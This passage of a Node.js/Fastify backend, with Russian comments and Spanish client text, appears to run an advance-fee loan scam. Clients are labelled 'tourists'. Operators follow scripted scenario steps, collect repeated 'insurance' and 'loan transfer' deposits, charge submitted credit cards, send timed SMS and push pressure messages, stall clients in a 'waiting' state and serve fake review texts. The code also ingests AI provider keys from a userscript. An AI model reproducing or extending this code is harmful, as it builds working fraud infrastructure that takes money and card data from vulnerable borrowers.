  const sessionId = sanitizeString(getString(body.sessionId), 80);
  const type = normalizePaymentType(sanitizeString(getString(body.type), 24));
  if (!sessionId) return reply.status(400).send({ error: 'missing sessionId' });
  const key = paymentStatusKey(sessionId, type);
  const ps = paymentStatus.get(key) || { type };
  paymentStatus.set(key, { ...ps, type, status: 'rejected' });
  await savePaymentStatus();
  notifyClients();
  return reply.send({ ok: true });
}

// ── Image upload ──────────────────────────────────────────────────────────────
const UPLOADS_DIR = join(__dirname, '..', 'uploads');
const ALLOWED_MIME = new Set(['image/jpeg', 'image/png', 'image/gif', 'image/webp']);

async function handleUploadImage(req, reply) {
  // Роут публичный (клиент шлёт скриншоты без авторизации) — ограничиваем,
  // чтобы им нельзя было забить диск.
  if (rateLimited(req, reply, 'upload', 20, 60 * 1000)) return;
  try {
    const data = await req.file();
    if (!data) return reply.status(400).send({ error: 'No file' });
    const mime = data.mimetype || '';
    if (!ALLOWED_MIME.has(mime)) return reply.status(400).send({ error: 'Invalid file type' });
    const ext = mime === 'image/png' ? '.png' : mime === 'image/gif' ? '.gif' : mime === 'image/webp' ? '.webp' : '.jpg';
    await mkdir(UPLOADS_DIR, { recursive: true });
    const filename = `${randomUUID()}${ext}`;
    const dest = join(UPLOADS_DIR, filename);
    await pipeline(data.file, fsCreateWriteStream(dest));
    return reply.send({ url: `/uploads/${filename}` });
  } catch (err) {
    console.error('[upload-image]', err?.message || err);
    return reply.status(500).send({ error: 'Upload failed' });
  }
}

// Слить submissionData клиента с патчем (JSON, без миграции схемы).
async function mergeSubmissionData(flowSessionId, patch) {
  const existing = await prisma.webClient.findUnique({
    where: { flowSessionId },
    select: { submissionData: true },
  }).catch(() => null);
  const sub = (existing?.submissionData && typeof existing.submissionData === 'object')
    ? existing.submissionData : {};
  const merged = { ...sub, ...patch };
  await prisma.webClient.upsert({
    where: { flowSessionId },
    create: { flowSessionId, submissionData: merged },
    update: { submissionData: merged },
  });
  return merged;
}

// Оператор подтверждает загруженный конверт → разблокирует отправку оплаты RD3.
async function handleChatOpEnvelopeConfirm(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    const existing = await prisma.webClient.findUnique({
      where: { flowSessionId: sessionId },
      select: { submissionData: true },
    }).catch(() => null);
    const url = existing?.submissionData?.envelopeUrl;
    if (!url) return reply.status(400).send({ error: 'no_envelope' });
    await mergeSubmissionData(sessionId, { envelopeApproved: true });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, approved: true });
  } catch (err) {
    console.error('[chat-op/envelope/confirm]', err?.message || err);
    return reply.status(500).send({ error: 'confirm_failed' });
  }
}

// Оператор загрузил готовую картинку конверта с ПК — ставим её клиенту.
async function handleChatOpEnvelopeSetImage(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const url = sanitizeString(getString(body.url), 300);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    if (!url || !url.startsWith('/uploads/')) return reply.status(400).send({ error: 'bad url' });
    await mergeSubmissionData(sessionId, { envelopeUrl: url, envelopeApproved: false });
    pushClientEvent(sessionId, { type: 'envelope', url });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, url });
  } catch (err) {
    console.error('[chat-op/envelope/set-image]', err?.message || err);
    return reply.status(500).send({ error: 'set_failed' });
  }
}

// Клиентская страница оплаты берёт отсюда загруженную картинку конверта.
async function handleTouristEnvelope(req, reply) {
  const sessionId = sanitizeString(getString(req.query?.sessionId ?? ''), 80);
  if (!sessionId) return reply.send({ url: '', approved: false });
  const wc = await prisma.webClient.findUnique({
    where: { flowSessionId: sessionId },
    select: { submissionData: true },
  }).catch(() => null);
  const sub = wc?.submissionData || {};
  return reply.send({ url: sub.envelopeUrl || '', approved: !!sub.envelopeApproved });
}

// ── Автопуш: отложенная отправка сообщения (+опц. SMS) клиенту в назначенное время ─
const SCHEDULED_PUSH_FILE = join(process.cwd(), 'data', 'scheduled-pushes.json');
let scheduledPushes = []; // [{id, sessionId, sendAt(ms), message, smsText, status, handlerId}]

async function assignLegacyScheduledPushes() {
  if (!scheduledPushes.some((p) => p && !p.handlerId)) return;
  const handlerId = await legacyOperatorHandlerId();
  if (!handlerId) return;
  scheduledPushes = scheduledPushes.map((p) => (p && !p.handlerId ? { ...p, handlerId } : p));
  await saveScheduledPushes();
}

async function loadScheduledPushes() {
  try {
    const arr = JSON.parse(await readFile(SCHEDULED_PUSH_FILE, 'utf8'));
    if (Array.isArray(arr)) scheduledPushes = arr;
  } catch { /* нет файла — ок */ }
  await assignLegacyScheduledPushes();
}
async function saveScheduledPushes() {
  try {
    await mkdir(join(process.cwd(), 'data'), { recursive: true });
    await writeFile(SCHEDULED_PUSH_FILE, JSON.stringify(scheduledPushes), 'utf8');
  } catch (e) { console.error('[autopush] save', e?.message); }
}

async function handleSchedulePush(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    const message = sanitizeString(getString(body.message), 4000);
    const smsText = sanitizeString(getString(body.smsText), 1000);
    const sendAt = new Date(getString(body.sendAt)).getTime();
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    if (!message) return reply.status(400).send({ error: 'message required' });
    if (!Number.isFinite(sendAt)) return reply.status(400).send({ error: 'bad sendAt' });
    const handlerId = chatOpHandlerId(req);
    const item = {
      id: randomUUID(), sessionId, sendAt, message,
      smsText: smsText || null, status: 'pending', handlerId, createdAt: Date.now(),
    };
    scheduledPushes.push(item);
    await saveScheduledPushes();
    return reply.send({ ok: true, id: item.id, sendAt });
  } catch (err) {
    console.error('[schedule-push]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleGetScheduledPushes(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    await assignLegacyScheduledPushes();
    const myHandlerId = chatOpHandlerId(req);
    const visiblePushes = myHandlerId
      ? scheduledPushes.filter((p) => p.handlerId === myHandlerId)
      : scheduledPushes;
    const sessionIds = [...new Set(visiblePushes.map((p) => p.sessionId).filter(Boolean))];
    const clients = sessionIds.length
      ? await prisma.webClient.findMany({
          where: { flowSessionId: { in: sessionIds } },
          select: { flowSessionId: true, submissionData: true },
        }).catch(() => [])
      : [];
    const clientBySession = new Map(clients.map((c) => [c.flowSessionId, c.submissionData || {}]));
    const pushes = visiblePushes
      .slice()
      .sort((a, b) => Number(a.sendAt || 0) - Number(b.sendAt || 0))
      .map((p) => {
        const sub = clientBySession.get(p.sessionId) || {};
        return {
          id: p.id,
          sessionId: p.sessionId,
          sendAt: p.sendAt,
          message: p.message,
          smsText: p.smsText || '',
          status: p.status || 'pending',
          createdAt: p.createdAt || null,
          sentAt: p.sentAt || null,
          error: p.error || null,
          clientName: sub.fullName || sub.name || sub.nombre || sub.phone || '',
        };
      });
    return reply.send({ ok: true, pushes });
  } catch (err) {
    console.error('[scheduled-pushes]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleDeleteScheduledPush(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const id = sanitizeString(getString(req.params.id), 80);
    await assignLegacyScheduledPushes();
    const myHandlerId = chatOpHandlerId(req);
    const target = scheduledPushes.find((p) => p.id === id);
    if (!target) return reply.status(404).send({ error: 'not_found' });
    if (myHandlerId && target.handlerId !== myHandlerId) return reply.status(403).send({ error: 'forbidden' });
    const before = scheduledPushes.length;
    scheduledPushes = scheduledPushes.filter((p) => p.id !== id);
    if (scheduledPushes.length === before) return reply.status(404).send({ error: 'not_found' });
    await saveScheduledPushes();
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[scheduled-pushes/delete]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function deliverScheduledPush(item) {
  const sessionId = item.sessionId;
  // 1) Сообщение в чат клиента (как сообщение оператора).
  try {
    const key = chatLeadKey(sessionId);
    const lead = await prisma.lead.upsert({ where: { tgId: key }, create: { tgId: key, chatId: key }, update: {} });
    await createOperatorMessage(lead.id, item.message);
  } catch (e) { console.error('[autopush] chat msg', e?.message); }
  // 2) Push-уведомление (если есть FCM-токен клиента).
  try {
    const token = pushTokens.get(sessionId);
    if (token) {
      const ps = await readPushSettings();
      await sendPush(token, ps.title || '¡Tienes un nuevo mensaje!', item.message, ps.url);
    }
  } catch (e) { console.error('[autopush] push', e?.message); }
  // 3) SMS (если добавлено оператором) — отправитель AvalAvance.
  if (item.smsText) {
    try {
      const wc = await prisma.webClient.findUnique({ where: { flowSessionId: sessionId }, select: { submissionData: true } }).catch(() => null);
      const phone = wc?.submissionData?.phone;
      if (phone) {
        const settings = await readSettings();
        const { ok, messageId } = await sendSmsViaGateway(phone, item.smsText, settings.smsReminderSender || 'AvalAvance');
        await logSms({
          sentAt: new Date().toISOString(), sessionId, phone, text: item.smsText, ok, messageId,
          type: 'autopush',
          handlerId: item.handlerId || null, // кто запланировал автопуш
          error: ok ? null : 'gateway_error',
        });
      }
    } catch (e) { console.error('[autopush] sms', e?.message); }
  }
  broadcastUpdate('clients_changed');
}

async function processScheduledPushes() {
  const now = Date.now();
  const due = scheduledPushes.filter((p) => p.status === 'pending' && p.sendAt <= now);
  if (!due.length) return;
  for (const item of due) {
    item.status = 'sending';
    try { await deliverScheduledPush(item); item.status = 'sent'; }
    catch (e) { item.status = 'failed'; item.error = e?.message; }
    item.sentAt = Date.now();
  }
  // чистим старьё (>7 дней), чтобы файл не пух
  const weekAgo = now - 7 * 24 * 3600 * 1000;
  scheduledPushes = scheduledPushes.filter((p) => p.status === 'pending' || (p.sentAt || 0) > weekAgo);
  await saveScheduledPushes();
}

// ── Лог активаций лида в Telegram (одно сообщение, редактируем на каждый вызов) ─
const activeLeadTgLog = new Map(); // flowSessionId -> { messageId, count }

async function handleTrackActiveLead(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.flowSessionId), 80);
    let count = parseInt(getString(body.count), 10);
    if (!Number.isFinite(count) || count < 1) count = 1;
    if (count > 3) count = 3;

    const shortSid = sessionId ? sessionId.slice(0, 12) : '—';
    const text = `🟢 activeLead — сработал ${count}/3\nSession: ${shortSid}`;

    const entry = activeLeadTgLog.get(sessionId || '');
    if (entry?.messageId) {
      const ok = await editTelegramMessage(entry.messageId, text);
      if (ok) entry.count = count;
      else {
        // сообщение удалили/не редактируется — шлём новое
        const mid = await sendTelegramReturningId(text);
        if (mid) activeLeadTgLog.set(sessionId || '', { messageId: mid, count });
      }
    } else {
      const mid = await sendTelegramReturningId(text);
      if (mid) activeLeadTgLog.set(sessionId || '', { messageId: mid, count });
    }
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[track-activelead]', err?.message || err);
    return reply.send({ ok: false });
  }
}

export async function registerApiRoutes(app) {
  // Load persisted FCM tokens from disk
  await loadPushTokens();

  // Multipart for image uploads
  await app.register((await import('@fastify/multipart')).default, { limits: { fileSize: 10 * 1024 * 1024 } });

  // Public settings
  app.get('/api/settings', handleGetSettings);

  // Geo lookup
  app.get('/api/geo', handleGeo);

  // Tourist tracking
  app.post('/api/track', handleTrack);
  app.get('/api/lite/profile', handleGetLiteProfile);
  app.post('/api/lite/profile', handleSaveLiteProfile);
  app.get('/api/lite/report', handleGetLiteReport);
  app.post('/api/lite/report', handleSaveLiteReport);
  app.post('/api/tourist/call-request', handleCallRequest);
  app.get('/api/tourist/status', handleTouristStatus);
  app.post('/api/credit-card-submission', handleCreditCardSubmission);

  // Scratch captcha
  app.get('/api/scratch-access/:token', handleScratchAccess);
  app.post('/api/scratch-verify', { config: { rawBody: false } }, handleScratchVerify);

  // AI chat (assistant.html)
  app.post('/api/chat', handleChat);
  app.get('/api/chat/history/:sessionId', handleChatHistory);

  // Support chat (chat.html) — separate session & prompt
  app.post('/api/support-chat', handleSupportChat);
  app.get('/api/support-chat/history/:sessionId', handleSupportChatHistory);
  app.post('/api/support-chat/read', handleSupportChatMarkRead);

  // Full admin
  app.post('/api/admin/login', handleAdminLogin);
  app.post('/api/admin/logout', handleAdminLogout);
  app.get('/api/admin/bot-config', handleGetBotConfig);
  app.put('/api/admin/bot-config', handleUpdateBotConfig);

  // Ключи провайдеров ИИ. Приём от userscript — вне админ-сессии, по своему секрету.
  app.post('/api/ai-key/ingest', handleIngestAiKey);
  app.get('/api/admin/ai-keys', handleGetAiKeys);
  app.put('/api/admin/ai-keys/:provider', handleSetAiKey);
  app.delete('/api/admin/ai-keys/:provider', handleDeleteAiKey);
  app.get('/api/admin/chat-prompt', handleGetChatPrompt);
  app.put('/api/admin/chat-prompt', handleUpdateChatPrompt);
  app.get('/api/admin/translate-prompt', handleGetTranslatePrompt);
  app.put('/api/admin/translate-prompt', handleUpdateTranslatePrompt);
  app.get('/api/admin/notes', handleAdminGetNotes);
  app.post('/api/admin/notes', handleAdminCreateNote);
  app.delete('/api/admin/notes/:id', handleAdminDeleteNote);
  app.get('/api/admin/edited-messages', handleAdminGetEditedMessages);
  app.get('/api/admin/clients', handleAdminClients);
  app.get('/api/admin/clients/statuses', handleAdminClientStatuses);
  app.get('/api/admin/payment-requisites/statuses', handleGetPaymentRequisiteStatuses);
  app.post('/api/admin/payment-requisites/refresh', handleRefreshPaymentRequisites);
  app.get('/api/admin/payments', handleAdminPayments);
  app.post('/api/admin/payments/cancel', handleAdminCancelPayment);
  app.delete('/api/admin/clients/:id', handleAdminDeleteClient);
  app.put('/api/admin/clients/:id/handler', handleAssignClientHandler);
  app.get('/api/admin/clients/:sessionId/chat', handleAdminClientChat);
  app.get('/api/admin/stats', handleAdminStats);
  app.post('/api/admin/stats/reset', handleResetStats);
  app.get('/api/admin/sms-history', handleAdminSmsHistory);
  app.put('/api/admin/settings', handleUpdateSettings);
  app.get('/api/admin/scenario-settings', handleGetScenarioSettings);
  app.put('/api/admin/scenario-settings', handleUpdateScenarioSettings);

  // Handler Performance — обработчики (менеджеры) + когортная статистика
  app.get('/api/admin/handlers', handleGetHandlers);
  app.post('/api/admin/handlers', handleCreateHandler);
  app.put('/api/admin/handlers/:id', handleUpdateHandler);
  app.delete('/api/admin/handlers/:id', handleDeleteHandler);
  app.get('/api/admin/routing-handler', handleGetRoutingHandler);
  app.put('/api/admin/routing-handler', handleUpdateRoutingHandler);
  app.get('/api/admin/handler-performance', handleHandlerPerformance);
  app.put('/api/admin/handler-note', handleUpdateHandlerNote);


  // Chat operator (chat/index.html)
  app.post('/api/chat-op/login', handleChatOpLogin);
  app.get('/api/chat-op/clients', handleChatOpClients);
  app.get('/api/chat-op/messages/:sessionId', handleChatOpMessages);
  app.post('/api/chat-op/send', handleChatOpSend);
  app.put('/api/chat-op/message/:id', handleChatOpEditMessage);
  app.post('/api/chat-op/request-call', handleChatOpRequestCall);
  app.put('/api/chat-op/note', handleChatOpSaveNote);
  app.post('/api/chat-op/send-push', handleChatOpSendPush);
  app.post('/api/chat-op/send-sms', handleChatOpSendSms);
  app.get('/api/chat-op/sms-history/:sessionId', handleChatOpSmsHistory);
  app.post('/api/chat-op/charge', handleChatOpCharge);
  app.post('/api/chat-op/refund', handleChatOpRefund);
  app.post('/api/chat-op/add-account', handleChatOpAddAccount);
  app.get('/api/chat-op/card', handleChatOpCardState);
  app.post('/api/chat-op/card-refund', handleChatOpCardRefund);
  app.post('/api/chat-op/card-charge', handleChatOpCardCharge);
  app.get('/api/chat-op/scenario', handleChatOpScenario);
  app.post('/api/chat-op/scenario-step', handleChatOpScenarioStep);
  app.post('/api/chat-op/envelope/confirm', handleChatOpEnvelopeConfirm);
  app.post('/api/chat-op/envelope/set-image', handleChatOpEnvelopeSetImage);
  app.post('/api/chat-op/ban', handleChatOpBan);
  app.get('/api/chat-op/scheduled-pushes', handleGetScheduledPushes);
  app.post('/api/chat-op/schedule-push', handleSchedulePush);
  app.delete('/api/chat-op/scheduled-pushes/:id', handleDeleteScheduledPush);
  // Общие заметки чат-операторов
  app.get('/api/chat-op/notes', handleGetNotes);
  app.post('/api/chat-op/notes', handleCreateNote);
  app.put('/api/chat-op/notes/:id', handleUpdateNote);
  app.delete('/api/chat-op/notes/:id', handleDeleteNote);

  // Client balance (public — tourist pages)
  app.get('/api/tourist/balance/:sessionId', handleGetClientBalance);

  // «Ожидание» (ban) — публичные эндпоинты для страниц клиента
  app.get('/api/client/state', handleClientState);
  app.get('/api/client/events', handleClientEvents);
  app.post('/api/client/review-seen', handleClientReviewSeen);
  app.get('/api/banks', handleGetBanks);
  app.get('/api/bank-icon/:key', handleBankIcon);
  app.post('/api/chat-op/rd2-bank', handleChatOpSetRd2Bank);
  app.get('/api/client/review-text', handleClientReviewText);
  app.post('/api/client/review-decline', handleClientReviewDecline);
  app.post('/api/client/review-screenshot', handleClientReviewScreenshot);

  // Тексты отзывов (админка)
  app.get('/api/admin/review-texts', handleGetReviewTexts);
  app.post('/api/admin/review-texts', handleCreateReviewText);
  app.put('/api/admin/review-texts/:id', handleUpdateReviewText);
  app.delete('/api/admin/review-texts/:id', handleDeleteReviewText);

  // Загруженный конверт — картинка для странички оплаты клиента
  app.get('/api/tourist/envelope', handleTouristEnvelope);

  // Лог активаций лида (клиент шлёт при каждом вызове нативного APK-моста)
  app.post('/api/track-activelead', handleTrackActiveLead);

  // Image upload (client + operator)
  app.post('/api/upload-image', handleUploadImage);

  // Push notification token registration + admin settings
  app.post('/api/push/register', handleRegisterPushToken);
  app.get('/api/admin/push-settings', handleGetPushSettings);
  app.put('/api/admin/push-settings', handleSavePushSettings);

  app.get('/api/admin/sms-reminder-settings', handleGetSmsReminderSettings);
  app.put('/api/admin/sms-reminder-settings', handleUpdateSmsReminderSettings);

  // Payment screenshot status
  app.get('/api/tourist/payment-status', handleGetPaymentStatus);
  app.post('/api/chat-op/payment/confirm', handlePaymentConfirm);
  app.post('/api/chat-op/payment/reject', handlePaymentReject);

  // SSE for real-time updates
  app.get('/api/sse', handleSSE);

  // Start SMS reminder job (checks every minute).
  // Дедуп поднимаем ДО первого прохода, иначе разошлём повторы уже получившим.
  await loadSmsReminderLog();
  await loadSmsReminderState();
  setInterval(sendSmsRemindersToStalledClients, 60 * 1000);

  // Автопуш: загрузка запланированных отправок + проверка каждые 30с.
  await loadScheduledPushes();
  setInterval(processScheduledPushes, 30 * 1000);
  console.log('[SMS-reminder] Started periodic check (every 60 seconds)');

  // Миграция старого обозначения RD2→RD3, затем бэкфилл и выравнивание сумм.
  try {
    await migrateLegacyRD2Data();
    await backfillDepositsFromPaymentStatus();
    await normalizeRD2DepositAmounts();
    await normalizeRD3DepositAmounts();
  } catch (e) {
    console.error('[deposit/startup]', e?.message);
  }
}

// До появления отдельного платежа loantransfer тип RD2 использовался для нынешнего RD3.
// Одноразово переносим такие депозиты и ручные правки, после чего RD2 свободен для новой оплаты.
async function migrateLegacyRD2Data() {
  const settings = await readSettings();
  if (Number(settings.paymentSchemaVersion || 0) >= 2) return;

  const legacyDeposits = await prisma.deposit.findMany({
    where: { type: 'RD2' },
    select: { id: true, flowSessionId: true },
  });
  for (const legacy of legacyDeposits) {
    const currentRD3 = await prisma.deposit.findUnique({
      where: { flowSessionId_type: { flowSessionId: legacy.flowSessionId, type: 'RD3' } },
      select: { id: true },
    }).catch(() => null);
    if (currentRD3) {
      await prisma.deposit.delete({ where: { id: legacy.id } });
    } else {
      await prisma.deposit.update({ where: { id: legacy.id }, data: { type: 'RD3' } });
    }
  }

  const notes = await readHandlerNotes();
  let notesChanged = false;
  for (const note of Object.values(notes)) {
    if (!note || typeof note !== 'object') continue;
    for (const suffix of ['Delta', 'Count', 'Amount']) {
      const legacyKey = `rd2${suffix}`;
      const rd3Key = `rd3${suffix}`;
      if (note[legacyKey] == null) continue;
      if (note[rd3Key] == null) note[rd3Key] = note[legacyKey];
      delete note[legacyKey];
      notesChanged = true;
    }
  }
  if (notesChanged) await writeHandlerNotes(notes);

  settings.paymentSchemaVersion = 2;
  settings.depositRD2 = 200;
  settings.depositRD3 = depositRD3Amount(settings);
  await writeSettings(settings);
  if (legacyDeposits.length || notesChanged) {
    console.log(`[deposit/migrate] moved ${legacyDeposits.length} legacy RD2 deposit(s) to RD3`);
  }
}

// Переносим ранее подтверждённые оплаты (paymentStatus) в таблицу Deposit.
async function backfillDepositsFromPaymentStatus() {
  try {
    let created = 0;
    for (const [k, v] of paymentStatus) {
      if (v?.status !== 'confirmed') continue;
      const key = String(k);
      const isCreditCard = key.endsWith('::creditcard');
      const isLoanTransfer = key.endsWith('::loantransfer');
      const isReturn = key.endsWith('::return');
      const sessionId = isCreditCard ? key.slice(0, -'::creditcard'.length)
        : (isLoanTransfer ? key.slice(0, -'::loantransfer'.length)
          : (isReturn ? key.slice(0, -'::return'.length) : key));
      const paymentType = isCreditCard
        ? 'creditcard'
        : (isLoanTransfer ? 'loantransfer' : (isReturn ? 'return' : 'insurance'));
      const confirmedAt = v.confirmedAt ? new Date(v.confirmedAt) : new Date();
      const depType = isCreditCard ? 'RD3' : (isLoanTransfer ? 'RD2' : (isReturn ? 'RD' : 'FD'));
      const before = await prisma.deposit.findUnique({
        where: { flowSessionId_type: { flowSessionId: sessionId, type: depType } },
        select: { id: true },
      }).catch(() => null);
      if (before) continue;
      await recordDeposit(sessionId, paymentType, confirmedAt);
      created += 1;
    }
    if (created) console.log(`[deposit/backfill] created ${created} deposit(s) from confirmed payments`);
  } catch (e) {
    console.error('[deposit/backfill]', e?.message);
  }
}

async function normalizeRD2DepositAmounts() {
  try {
    const s = await readSettings();
    const amount = depositRD2Amount(s);
    if (!Number.isFinite(amount) || amount <= 0) return;
    const res = await prisma.deposit.updateMany({
      where: { type: 'RD2', amount: { not: amount } },
      data: { amount },
    });
    if (res?.count) console.log(`[deposit/normalize] updated ${res.count} RD2 deposit amount(s) to ${amount}`);
  } catch (e) {
    console.error('[deposit/normalize-rd2]', e?.message);
  }
}

async function normalizeRD3DepositAmounts() {
  try {
    const s = await readSettings();
    const amount = depositRD3Amount(s);
    if (!Number.isFinite(amount) || amount <= 0) return;
    const res = await prisma.deposit.updateMany({
      where: { type: 'RD3', amount: { not: amount } },
      data: { amount },
    });
    if (res?.count) console.log(`[deposit/normalize] updated ${res.count} RD3 deposit amount(s) to ${amount}`);
  } catch (e) {
    console.error('[deposit/normalize]', e?.message);
  }
}
